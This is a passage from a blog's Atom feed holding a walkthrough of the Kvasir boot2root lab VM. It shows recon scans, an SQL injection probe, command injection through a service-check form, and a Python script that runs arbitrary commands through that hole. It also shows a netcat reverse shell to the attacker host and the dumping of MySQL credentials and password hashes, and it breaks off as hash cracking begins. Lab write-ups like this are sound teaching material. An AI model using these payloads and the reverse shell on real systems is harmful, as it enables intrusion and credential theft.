<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[#!/slash/note]]></title>
  <link href="http://leonjza.github.io/atom.xml" rel="self"/>
  <link href="http://leonjza.github.io/"/>
  <updated>2014-11-10T19:54:03+02:00</updated>
  <id>http://leonjza.github.io/</id>
  <author>
    <name><![CDATA[Leon Jacobs]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[solving kvasir - netcat edition]]></title>
    <link href="http://leonjza.github.io/blog/2014/11/09/solving-kvasir-netcat-edition/"/>
    <updated>2014-11-09T10:27:09+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/11/09/solving-kvasir-netcat-edition</id>
    <content type="html"><![CDATA[<h2>introduction</h2>

<p><a href="http://vulnhub.com/entry/kvasir-i,106/">Kvasir</a>, a boot2root by <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> has to be one of my most favorite boot2roots to date, if not the most favorite. Favorite however does not mean it was easy. It also proved to be one of the most challenging ones I have had the chance to try!</p>

<p><img class="right" src="https://i.imgur.com/gHw2Q50.gif"> Kvasir is <em>extremely</em> well polished, and it can be seen throughout the VM that <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> has gone through a lot of effort to make every challenge as rewarding as possible. From exploiting simple web based vulnerabilities to service misconfigurations, traffic sniffing, steganography, forensics and cryptopraphy, Kvasir has it all! Solving it also had me make really heavy use of good old netcat.</p>

<p>This writeup details the path I took to read the final flag :)</p>

<!-- more -->


<h2>a usual start</h2>

<p>Before we start off though, I feel its important to touch base on tunneling techniques used. All of the tunneling was done either via netcat, or via a SSH socks proxy. The socks proxies were accessed using <code>proxychains</code>, and I was editing <code>/etc/proxychains.conf</code> to match the port of the proxy I needed to use to reach my desired destination.</p>

<p>With that out the way, lets start.<br/>
Almost all of the boot2roots have a discovery phase. After downloading the archive from <a href="http://vulnhub.com">vulnhub.com</a>, I ran a ping scan in the subnet that my host-only network lives in. It returned with no results, and I realized there may already be more to this than anticipated. I engaged <em>lazy mode</em>™ and checked what the VirtualBox session showed the IP was:</p>

<p><img src="https://i.imgur.com/ZTj0D3h.png"></p>

<p><strong>192.168.56.102</strong>. Sweet, throwing <code>nmap</code> at it showed only <code>tcp/80</code> as open.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap 192.168.56.102
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-11-09 11:07 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.102
</span><span class='line'>Host is up <span class="o">(</span>0.000061s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 999 closed ports
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>80/tcp open  http
</span><span class='line'>MAC Address: 08:00:27:CF:5D:57 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 0.20 seconds
</span></code></pre></td></tr></table></div></figure>


<h2>fink ur gud enuf?</h2>

<p>Browsing to the IP using Iceweasel, we see a login portal presented to us:</p>

<p><img src="https://i.imgur.com/vUSSRt7.png"></p>

<p>I made a few attempts at guessing a login, and eventually just threw a <code>'</code> at the username field:</p>

<p><img src="https://i.imgur.com/gVb0iK7.png"></p>

<p>I had a instant troll alert and figured it can&rsquo;t be <em>that</em> easy!? Changing the username payload from <code>'</code> to <code>' OR 1=1 LIMIT 1--</code> with a random word as a password, resulted in the application returning a <code>403</code> type response. I figured that something strange was going on here, and fired up <a href="http://portswigger.net/burp/">Burp Suite</a> to have a look under the hood at what is happening. As seen in the web browser, the web server really does respond with a HTTP 403:</p>

<p><img src="https://i.imgur.com/mAxhkaG.png"></p>

<p>Moving on to the register page. Registration required a username and password, as well as a date of birth. I registered <code>bob:bob</code> with a DoB of <code>09/09/09</code>, and attempted to login with the credentials:</p>

<p><img src="https://i.imgur.com/o9Utreq.png"></p>

<p>Not a very useful web application so far, but nonetheless, I figured there is something I am not seeing yet. I went back to the registration page and attempted some SQLi payloads there. The form definitely seemed vulnerable to SQLi, and I managed to uncover a part of the backend query as <code>'a', 'a', 0, NULL)</code>. Considering this was a new account registration page, my guess was that this was part of a <code>INSERT</code> query:</p>

<p><img src="https://i.imgur.com/DA1Xe5H.png"></p>

<p>It was about at this time where that thing called real life started to interfere and drive my attention away from Kvasir. While working, I decided to run trusty &lsquo;ol <code>wfuzz</code> on the web service to see if there was anything interesting to reveal:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt  --hc 404 http://192.168.56.102/FUZZ.php
</span><span class='line'>
</span><span class='line'>********************************************************
</span><span class='line'>* Wfuzz  2.0 - The Web Bruteforcer                     *
</span><span class='line'>********************************************************
</span><span class='line'>
</span><span class='line'>Target: http://192.168.56.102/FUZZ.php
</span><span class='line'>Payload <span class="nb">type</span>: file,/usr/share/wordlists/wfuzz/general/medium.txt
</span><span class='line'>
</span><span class='line'>Total requests: <span class="nv">1660</span>
</span><span class='line'><span class="o">==================================================================</span>
</span><span class='line'>ID  Response   Lines      Word         Chars          <span class="nv">Request</span>
</span><span class='line'><span class="o">==================================================================</span>
</span><span class='line'>
</span><span class='line'>00077:  <span class="nv">C</span><span class="o">=</span>302     16 L        34 W      365 Ch    <span class="s2">&quot; - admin&quot;</span>
</span><span class='line'>00302:  <span class="nv">C</span><span class="o">=</span>403     10 L        30 W      294 Ch    <span class="s2">&quot; - cgi-bin/&quot;</span>
</span><span class='line'>00394:  <span class="nv">C</span><span class="o">=</span>403     10 L        30 W      292 Ch    <span class="s2">&quot; - create&quot;</span>
</span><span class='line'>00455:  <span class="nv">C</span><span class="o">=</span>403     10 L        30 W      294 Ch    <span class="s2">&quot; - descarga&quot;</span>
</span><span class='line'>00457:  <span class="nv">C</span><span class="o">=</span>403     10 L        30 W      296 Ch    <span class="s2">&quot; - descarrega&quot;</span>
</span><span class='line'>00463:  <span class="nv">C</span><span class="o">=</span>403     10 L        30 W      298 Ch    <span class="s2">&quot; - descarregues&quot;</span>
</span><span class='line'>00741:  <span class="nv">C</span><span class="o">=</span>200     20 L        44 W      464 Ch    <span class="s2">&quot; - index&quot;</span>
</span><span class='line'>00894:  <span class="nv">C</span><span class="o">=</span>403     10 L        30 W      290 Ch    <span class="s2">&quot; - load&quot;</span>
</span><span class='line'>00901:  <span class="nv">C</span><span class="o">=</span>302      0 L         0 W        0 Ch    <span class="s2">&quot; - login&quot;</span>
</span><span class='line'>00904:  <span class="nv">C</span><span class="o">=</span>302      0 L         0 W        0 Ch    <span class="s2">&quot; - logout&quot;</span>
</span><span class='line'>00964:  <span class="nv">C</span><span class="o">=</span>302     15 L        16 W      168 Ch    <span class="s2">&quot; - member&quot;</span>
</span><span class='line'>01247:  <span class="nv">C</span><span class="o">=</span>200     17 L        39 W      426 Ch    <span class="s2">&quot; - register&quot;</span>
</span><span class='line'>01331:  <span class="nv">C</span><span class="o">=</span>403     10 L        30 W      292 Ch    <span class="s2">&quot; - select&quot;</span>
</span><span class='line'>01432:  <span class="nv">C</span><span class="o">=</span>200      0 L         0 W        0 Ch    <span class="s2">&quot; - submit&quot;</span>
</span><span class='line'>01556:  <span class="nv">C</span><span class="o">=</span>403     10 L        30 W      292 Ch    <span class="s2">&quot; - update&quot;</span>
</span><span class='line'>01565:  <span class="nv">C</span><span class="o">=</span>403     10 L        30 W      293 Ch    <span class="s2">&quot; - updates&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Woa, thats quite a bit of results to work through eh :)</p>

<h2>admins only want to 302 here</h2>

<p>Of everything <code>wfuzz</code> revealed to us, <code>admin.php</code> was the most interesting one. Watching Burp as the requests went up and down, I noticed that <code>admin.php</code> would return a HTTP 302 code with a location, along with an actual body:</p>

<p><img src="https://i.imgur.com/exdmq5A.png"></p>

<p>Sweet! I modified the response in Burp to return <code>200</code> instead, and removed the <code>Location:</code> header. We now had a new page to work with :)</p>

<p><img src="https://i.imgur.com/6WoT1x2.png"></p>

<p>The form hints that we can check the service status of daemons running on the underlying OS, and suggests <code>apache2</code> as input. I submitted the form with <code>apache2</code> as the service, and got back a response (that also tried to 302 but I fixed that :D) with a new section <code>Apache2 is running (pid 1330).</code>. This just <strong>screams</strong> command injection doesn’t it?</p>

<h2>command injection</h2>

<p>In order for me to fuzz this further, I took the request to trusty &lsquo;ol <code>curl</code>. While doing this, I realized that <code>admin.php</code> did no checks to ensure that we are authenticated or anything. We could simply submit <code>service=&lt;payload&gt;</code> as a POST to <code>admin.php</code> and get output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl <span class="s1">&#39;http://192.168.56.102/admin.php&#39;</span> --data <span class="s1">&#39;service=apache2;&#39;</span>
</span><span class='line'>
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;div <span class="nv">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span>&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Service Check&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;form <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;service&quot;</span> <span class="nv">method</span><span class="o">=</span><span class="s2">&quot;post&quot;</span> <span class="nv">action</span><span class="o">=</span><span class="s2">&quot;&quot;</span>&gt;
</span><span class='line'>&lt;input <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;service&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;service&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nv">placeholder</span><span class="o">=</span><span class="s2">&quot;apache2&quot;</span> /&gt;&lt;br /&gt;&lt;br /&gt;
</span><span class='line'>&lt;input <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;Submit&quot;</span> /&gt;
</span><span class='line'>&lt;/form&gt;
</span><span class='line'>
</span><span class='line'>&lt;form <span class="nv">action</span><span class="o">=</span><span class="s2">&quot;logout.php&quot;</span> <span class="nv">method</span><span class="o">=</span><span class="s2">&quot;post&quot;</span>&gt;
</span><span class='line'>&lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;Logout&quot;</span> /&gt;
</span><span class='line'>&lt;/form&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;Usage: /etc/init.d/apache2 <span class="o">{</span>start<span class="p">|</span>stop<span class="p">|</span>graceful-stop<span class="p">|</span>restart<span class="p">|</span>reload<span class="p">|</span>force-reload<span class="p">|</span>start-htcacheclean<span class="p">|</span>stop-htcacheclean<span class="p">|</span>status<span class="o">}</span>.
</span><span class='line'>&lt;/pre&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Entering <code>apache2;</code> as the input, revealed the first step in our command injection. With <code>apache2;</code> as the payload, I figured that the php script was taking our user input and running with the following pseudo code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;/etc/init.d/&quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;service&quot;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot; status&quot;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, with our payload, we have modified this to run <code>/etc/init.d/apache2; status</code>, which will fail for obvious reasons! A little more fiddling finally got me to a working payload by posting <code>service=</code> as <code>;echo 'id';</code> where the single quotes are actually back ticks. (octopress grrr)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl <span class="s1">&#39;http://192.168.56.102/admin.php&#39;</span> --data <span class="s1">&#39;service=;echo `id`;&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;uid<span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'>&lt;/pre&gt;
</span></code></pre></td></tr></table></div></figure>


<h2>netcat is our entry into the rabbit hole</h2>

<p>With the command injection now exploitable, I grabbed some skeleton code that I normally use to try and make these types of command execution vulnerabilities slightly easier to work with. The basic premise is to have the command executed, and the response regex&rsquo;d out. This ended up as the following python script:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Kvasir Command Execution</span>
</span><span class='line'>
</span><span class='line'><span class="c"># $ python cmd.py &quot;uname -a&quot;</span>
</span><span class='line'><span class="c"># Command to run: uname -a</span>
</span><span class='line'><span class="c"># </span>
</span><span class='line'><span class="c"># Linux web 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64 GNU/Linux</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">requests</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">re</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">binascii</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;Command to run: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="c"># generate 2 random strings so that we can regex out the command output</span>
</span><span class='line'><span class="n">command_start</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">b2a_hex</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">30</span><span class="p">))</span>
</span><span class='line'><span class="n">command_end</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">b2a_hex</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">30</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># prepare something that we can regex out</span>
</span><span class='line'><span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;service&#39;</span> <span class="p">:</span> <span class="s">&#39;;echo </span><span class="si">%s</span><span class="s">; echo `</span><span class="si">%s</span><span class="s">`; echo </span><span class="si">%s</span><span class="s">;&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">command_start</span><span class="p">,</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">command_end</span><span class="p">)</span> <span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c">#fetch, ignoring the troll redirect</span>
</span><span class='line'><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&#39;http://192.168.56.102/admin.php&#39;</span><span class="p">,</span> <span class="n">params</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c">#match regex and print</span>
</span><span class='line'><span class="k">print</span>  <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&#39;</span><span class="si">%s</span><span class="s">([^|]+)</span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">command_start</span><span class="p">,</span> <span class="n">command_end</span><span class="p">),</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="si">%s</span><span class="se">\n</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">command_end</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, now I can just run <code>python cmd.py "id"</code> and get the output (the <em>(kvasir)</em> in front of my prompt is my python virtualenv where I installed the <code>requests</code> dependency):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>kvasir<span class="o">)</span>root@kali:~# python cmd.py <span class="s2">&quot;id&quot;</span>
</span><span class='line'>Command to run: id
</span><span class='line'>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>And so, initial enumeration was done. Immediately I noticed that this host had 2 network interfaces. <strong>192.168.1.100</strong> and <strong>192.168.2.100</strong>. No sign of <strong>192.168.56.102</strong> here&hellip; It also seemed like I would be able to build a netcat shell out of this environment to my attacking host, so I set up a listener with <code>nc -lvp 4444</code>, and connected to it using my <code>cmd.py</code> script <code>python cmd.py "/bin/nc 192.168.56.101 4444 -e /bin/bash"</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvp 4444
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> 4444 ...
</span><span class='line'>192.168.56.102: inverse host lookup failed: Unknown server error : Connection timed out
</span><span class='line'>connect to <span class="o">[</span>192.168.56.101<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.56.102<span class="o">]</span> 53516
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, in order to make sure we don&rsquo;t lose our place, consider the following simple diagram showing the network paths for gaining first shell access to the host <code>web</code>:</p>

<p><img src="https://i.imgur.com/Q2rSi2G.png"></p>

<p>The only public presence of the internal network is therefore the originally discovered <strong>192.168.56.102</strong> IP address.</p>

<h2>my-see-qual as root deserves a slap on the wrist</h2>

<p>With semi interactive shell access using <code>netcat</code> to <strong>web</strong> (192.168.1.100), some more enumeration was done. Most importantly, the sources serving the web site that I have exploited to gain a command shell revealed credentials and a host of a MySQL instance. Consider the following extract from <code>member.php</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>
</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;member&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">header</span><span class="p">(</span><span class="s2">&quot;Location: index.php&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$user</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'><span class="nb">mysql_connect</span><span class="p">(</span><span class="s2">&quot;192.168.2.200&quot;</span><span class="p">,</span> <span class="s2">&quot;webapp&quot;</span><span class="p">,</span> <span class="s2">&quot;webapp&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
</span><span class='line'><span class="nb">mysql_select_db</span><span class="p">(</span><span class="s2">&quot;webapp&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT dob FROM users WHERE username=&#39;</span><span class="si">$user</span><span class="s2">&#39;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">[... snip ...]</span>
</span></code></pre></td></tr></table></div></figure>


<p>So mysql access with <code>webapp:webapp</code> at 192.168.2.200. Lets test this and check out the server. I executed commands using mysql -e on the netcat shell that just spawned:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mysql -uwebapp -pwebapp -h 192.168.2.200 -e <span class="s1">&#39;show grants;&#39;</span>
</span><span class='line'>Grants <span class="k">for </span>webapp@192.168.2.100
</span><span class='line'>GRANT SELECT, INSERT ON *.* TO <span class="s1">&#39;webapp&#39;</span>@<span class="s1">&#39;192.168.2.100&#39;</span> IDENTIFIED BY PASSWORD <span class="s1">&#39;*BF7C27E734F86F28A9386E9759D238AFB863BDE3&#39;</span>
</span><span class='line'>GRANT ALL PRIVILEGES ON <span class="sb">`</span>webapp<span class="sb">`</span>.* TO <span class="s1">&#39;webapp&#39;</span>@<span class="s1">&#39;192.168.2.100&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>So I can select anywhere. Nice :)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mysql -uwebapp -pwebapp -h 192.168.2.200 -e <span class="s1">&#39;use webapp; show tables;&#39;</span>
</span><span class='line'>Tables_in_webapp
</span><span class='line'>todo
</span><span class='line'>users
</span><span class='line'>mysql -uwebapp -pwebapp -h 192.168.2.200 -e <span class="s1">&#39;use webapp; select * from todo;&#39;</span>
</span><span class='line'>task
</span><span class='line'>stop running mysql as root
</span></code></pre></td></tr></table></div></figure>


<p>A table called <code>todo</code> exists, with a string <code>stop running mysql as root</code>. That was the first hint and immediately had me thinking about <a href="http://www.mysqludf.org/">MySQL UDF</a>&rsquo;s, one which could allow us to run system commands. However, in order to get a UDF loaded, I will need a dba level account, one which I don&rsquo;t have yet. From the previous grants output, I can see that I am allowed to query any table on the database server, so lets get some administrative hashes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mysql -uwebapp -pwebapp -h 192.168.2.200 -e <span class="s1">&#39;use mysql; select DISTINCT User,Password from user;&#39;</span>
</span><span class='line'>User    Password
</span><span class='line'>root    *ECB01D78C2FBEE997EDA584C647183FD99C115FD
</span><span class='line'>debian-sys-maint    *E0E0871376896664A590151D348CCE9AA800435B
</span><span class='line'>webapp  *BF7C27E734F86F28A9386E9759D238AFB863BDE3
</span></code></pre></td></tr></table></div></figure>


<p>As a side note, further enumeration of the PHP sources and MySQL table <code>users</code> showed that if we injected SQL on the registration page to add a extra <code>1</code>, we would be considered an admin, and would have also seen the admin page that is vulnerable to the already found command injection.</p>

<h3>cracking root&rsquo;s MySQL password</h3>

<p>Now that I had the password hash for the root user, I proceeded to try and crack it. For this I used <code>hashcat</code> with the ever famous <code>rockyou</code> wordlist:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
